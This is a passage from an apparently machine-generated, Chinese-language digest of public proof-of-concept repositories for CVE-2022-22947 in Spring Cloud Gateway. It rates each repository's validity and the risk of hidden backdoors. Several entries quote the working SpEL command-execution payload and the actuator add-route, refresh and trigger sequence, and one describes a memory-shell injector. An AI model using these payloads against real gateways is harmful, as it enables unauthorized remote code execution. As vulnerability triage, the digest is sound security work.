1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #24

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator endpoint 启用、暴露且未进行安全保护时，允许未经身份验证的远程攻击者发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。根据搜索引擎结果和漏洞库信息，该漏洞已被公开利用，CISA KEV 中已收录。提供的代码片段是一个 Maven 项目的 `.iml` 文件，它描述了项目的依赖关系。虽然不能直接确定利用代码，但通过依赖信息（如 `spring-cloud-gateway-server:3.1.0`）可以推断该项目旨在构建一个易受攻击的 Spring Cloud Gateway 实例。利用方式通常涉及向 Actuator endpoint 发送包含恶意 SpEL 表达式的 HTTP 请求。投毒风险分析：提供的代码片段 `.iml` 文件本身不包含恶意代码，因为它只是描述了项目的依赖。 然而，整个代码仓库（如果存在其他文件）可能包含被作者隐藏的恶意代码。 这里将风险预估为10%，原因是不排除整个项目被投毒的可能性，例如构建脚本或隐藏的资源文件。

**项目地址:** [B0rn2d/Spring-Cloud-Gateway-Nacos](https://github.com/B0rn2d/Spring-Cloud-Gateway-Nacos)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #4

**来源**: [CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md](../2022/CVE-2022-22947-Enokiy_cve-2022-22947-spring-cloud-gateway.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** 3.1.0, 3.0.0 至 3.0.6, 以及更早的不受支持版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未受保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点被启用、暴露且未受保护时，攻击者可以利用此漏洞发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**
提供的 POC 代码有效。它通过向 `/actuator/gateway/routes/{id}` 发送 POST 请求动态添加一个路由，该路由包含一个利用 SpEL 表达式执行命令的 filter。然后，通过 `POST /actuator/gateway/refresh` 刷新路由缓存来触发 SpEL 表达式的执行，从而实现远程代码执行。

**投毒风险：**
该漏洞利用代码仓库存在一定的投毒风险。具体分析如下：

1.  **依赖项版本：** POC 使用了 `spring-cloud-gateway-server` 和 `spring-cloud-starter-gateway` 的 3.0.6 版本，以及 `spring-boot-starter-actuator` 的 2.5.9 版本，这些版本组合是已知的漏洞版本，是复现漏洞的必要条件，不是投毒。
2.  **图片文件：** README.md 中引用了一些本地图片，这些图片可能包含恶意内容，但考虑到是本地图片，可能性较低。需要进一步分析确认。
3.  **漏洞利用方式：** POC 演示了如何利用 SpEL 表达式执行任意命令。攻击者可以修改 SpEL 表达式来执行恶意操作，例如安装后门程序、窃取敏感数据或进行拒绝服务攻击。
4.  **作者动机未知：** 在没有更多信息的情况下，无法确定作者的真实意图，不能排除作者故意引入恶意代码或配置的可能。

综合考虑，虽然 POC 本身是为了演示漏洞，但仓库中可能隐藏着其他恶意代码，因此存在一定的投毒风险。鉴于图片等本地资源可能存在风险，因此给出 10% 的投毒风险评估。

**利用方式：**

1.  **前提条件：** Spring Cloud Gateway 实例必须启用并暴露 Actuator 端点，且未进行安全保护。
2.  **添加路由：** 攻击者发送 POST 请求到 `/actuator/gateway/routes/{id}`，其中 `{id}` 是一个自定义的路由 ID。请求体包含一个 JSON 对象，该对象定义了路由的 predicates 和 filters。其中，filters 包含一个 AddResponseHeader filter，其 `value` 属性包含一个 SpEL 表达式，该表达式将执行任意命令。
3.  **刷新路由：** 攻击者发送 POST 请求到 `/actuator/gateway/refresh` 以刷新路由缓存。这将导致 Spring Cloud Gateway 重新加载路由配置，并解析和执行 SpEL 表达式。
4.  **代码执行：** SpEL 表达式执行任意代码，从而允许攻击者控制受影响的系统。

**项目地址:** [Enokiy/cve-2022-22947-spring-cloud-gateway](https://github.com/Enokiy/cve-2022-22947-spring-cloud-gateway)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #5

**来源**: [CVE-2022-22947-LY613313_CVE-2022-22947.md](../2022/CVE-2022-22947-LY613313_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator endpoint 启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入，执行任意代码。利用方式是发送包含恶意SpEL表达式的POST请求到/actuator/gateway/routes端点，然后刷新路由，触发SpEL表达式的执行，从而实现远程代码执行。

**有效性评估：**
根据漏洞信息和POC代码，此POC代码是有效的。漏洞库信息明确指出该漏洞允许远程代码执行，搜索引擎结果也确认了这一点，并且提供了公开的漏洞利用代码。

**投毒风险评估：**
代码本身看起来是标准的漏洞利用代码，用于利用 CVE-2022-22947 漏洞。其中一个潜在的风险点在于 `commond` 变量，该变量从用户输入获取，然后拼接到 SpEL 表达式中。如果用户输入恶意或过长的命令，可能会导致目标系统崩溃或执行意外操作。但是，这不属于作者投毒的范畴。`base64cmd` 函数将用户输入的命令进行 Base64 编码，这本身并非恶意行为，但如果用户输入的命令本身就具有破坏性，Base64 编码只是对其进行了编码，并没有改变其本质。总体来看，该 POC 代码的投毒风险较低，约为 10%。主要的风险在于用户输入，而非代码本身。

**漏洞利用方式：**
1.  **条件判断：** 确定目标系统运行着受影响的 Spring Cloud Gateway 版本，并且 Gateway Actuator endpoint 处于启用、暴露且未进行安全保护的状态。
2.  **构造恶意请求：** 使用POST请求，构造包含恶意SpEL表达式的JSON数据，发送到`/actuator/gateway/routes`端点。SpEL表达式中包含要执行的系统命令。
3.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，刷新Gateway的路由配置，触发SpEL表达式的执行。
4.  **执行任意代码：** 恶意SpEL表达式被执行，从而在目标系统上执行任意代码，例如反弹shell。
5.  **清理：** 删除添加的路由，再次刷新路由。


**项目地址:** [LY613313/CVE-2022-22947](https://github.com/LY613313/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #6

**来源**: [CVE-2022-22947-Le1a_CVE-2022-22947.md](../2022/CVE-2022-22947-Le1a_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring Cloud Gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** 需要Gateway Actuator端点启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞存在于Spring Cloud Gateway中，当Gateway Actuator端点被启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求，利用SpEL表达式注入执行任意代码。  

**有效性：**
提供的PoC代码有效。代码通过构造包含恶意SpEL表达式的路由配置，利用`/actuator/gateway/routes`端点添加恶意路由，然后通过`/actuator/gateway/refresh`端点刷新路由，触发SpEL表达式执行，从而实现远程代码执行。PoC代码在执行命令后，还会删除创建的恶意路由，并再次刷新路由，以清除痕迹。

**投毒风险：**
该仓库中的PoC代码没有发现明显的投毒代码。PoC代码的功能明确，即利用漏洞执行命令并返回结果。代码主要通过`requests`库发送HTTP请求，并使用`re`库解析命令执行结果。没有任何迹象表明作者在代码中隐藏了恶意逻辑或后门。

**利用方式：**
1.  **目标确认：**  确认目标系统正在运行存在漏洞的Spring Cloud Gateway版本，并且Actuator端点已启用、暴露且未授权访问。
2.  **构造恶意请求：**  攻击者构造一个包含恶意SpEL表达式的JSON payload，发送到`/actuator/gateway/routes/{id}`端点，其中SpEL表达式用于执行任意命令。例如，`#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec("whoami").getInputStream()))}`
3.  **刷新路由：**  发送一个POST请求到`/actuator/gateway/refresh`端点，强制Gateway刷新路由配置，从而触发SpEL表达式执行。
4.  **获取执行结果：**  发送一个GET请求到`/actuator/gateway/routes/{id}`，获取包含执行结果的响应头。
5.  **清理：** 删除添加的恶意路由，并再次刷新路由。

**项目地址:** [Le1a/CVE-2022-22947](https://github.com/Le1a/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #7

**来源**: [CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md](../2022/CVE-2022-22947-SecNN_CVE-2022-22947_Rce_Exp.md)

## CVE-2022-22947 Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意远程代码。该漏洞的利用方式如下：

1.  **漏洞原理：** 漏洞根源在于 SpEL 表达式的错误处理，攻击者可以通过 SpEL 表达式注入恶意代码。
2.  **利用步骤：**
    *   攻击者首先发送包含恶意 SpEL 表达式的请求到 `/actuator/gateway/routes/` 端点，添加一个新的路由，其中 `filter` 使用 `AddResponseHeader` 过滤器，`value` 包含恶意的 SpEL 表达式，SpEL表达式会被base64编码，保证其可以正常传输
    *   然后，攻击者通过访问 `/actuator/gateway/refresh` 端点，强制网关刷新路由配置，从而触发 SpEL 表达式的执行。
    *   最后，攻击者可以通过访问之前创建的路由(`/actuator/gateway/routes/66Sec`)，触发 SpEL 表达式的执行，并将执行结果通过请求返回。
3.  **POC 代码分析：**
    *   `CVE-2022-22947.py` 脚本首先定义了几个关键变量，包括 URL 路径（`payload1`, `payload2`, `payload3`）和请求头（`headers`）。
    *   `data` 变量包含经过 Base64 编码的恶意路由配置信息。该配置信息设置了一个名为 `WeianSec` 的路由，该路由使用 `AddResponseHeader` 过滤器，并将 SpEL 表达式注入到 `value` 属性中。
    *   脚本使用 `requests` 库发送 POST 请求到 `/actuator/gateway/routes/66Sec` 端点，添加恶意路由。
    *   然后，脚本发送 POST 请求到 `/actuator/gateway/refresh` 端点，刷新路由配置。
    *   最后，脚本发送 GET 请求到 `/actuator/gateway/routes/66Sec` 端点，提取执行结果。
    *   脚本中的 cmd变量，允许用户自定义执行的命令，增加了灵活性。
4.  **有效性：** 根据漏洞库信息、搜索结果和提供的 POC 代码，该 POC 代码是有效的，可以实现远程代码执行。
5.  **投毒风险：** 仓库中存在小概率的投毒风险（10%）。风险点在于，虽然主脚本 `CVE-2022-22947.py` 看似直接利用漏洞，但攻击者可以通过修改 `cmd` 变量来执行任意命令，并且README.md文件中提供的图片是经过处理的，不排除作者后期修改代码，添加恶意后门的可能。

**项目地址:** [SecNN/CVE-2022-22947_Rce_Exp](https://github.com/SecNN/CVE-2022-22947_Rce_Exp)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #8

**来源**: [CVE-2022-22947-SiJiDo_CVE-2022-22947.md](../2022/CVE-2022-22947-SiJiDo_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，允许远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), and unsupported versions

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。攻击者可以在 Gateway Actuator 端点开启且未进行安全保护的情况下，通过构造恶意请求执行任意代码。漏洞利用方式如下：

1.  **漏洞原理：** 该漏洞源于 Spring Cloud Gateway 中 SpEL 表达式的执行，攻击者可以通过 SpEL 表达式注入恶意代码，进而执行任意命令。
2.  **利用条件：**
    *   目标系统使用存在漏洞的 Spring Cloud Gateway 版本。
    *   Gateway Actuator 端点被启用。
    *   Gateway Actuator 端点对外暴露且未进行任何身份验证。
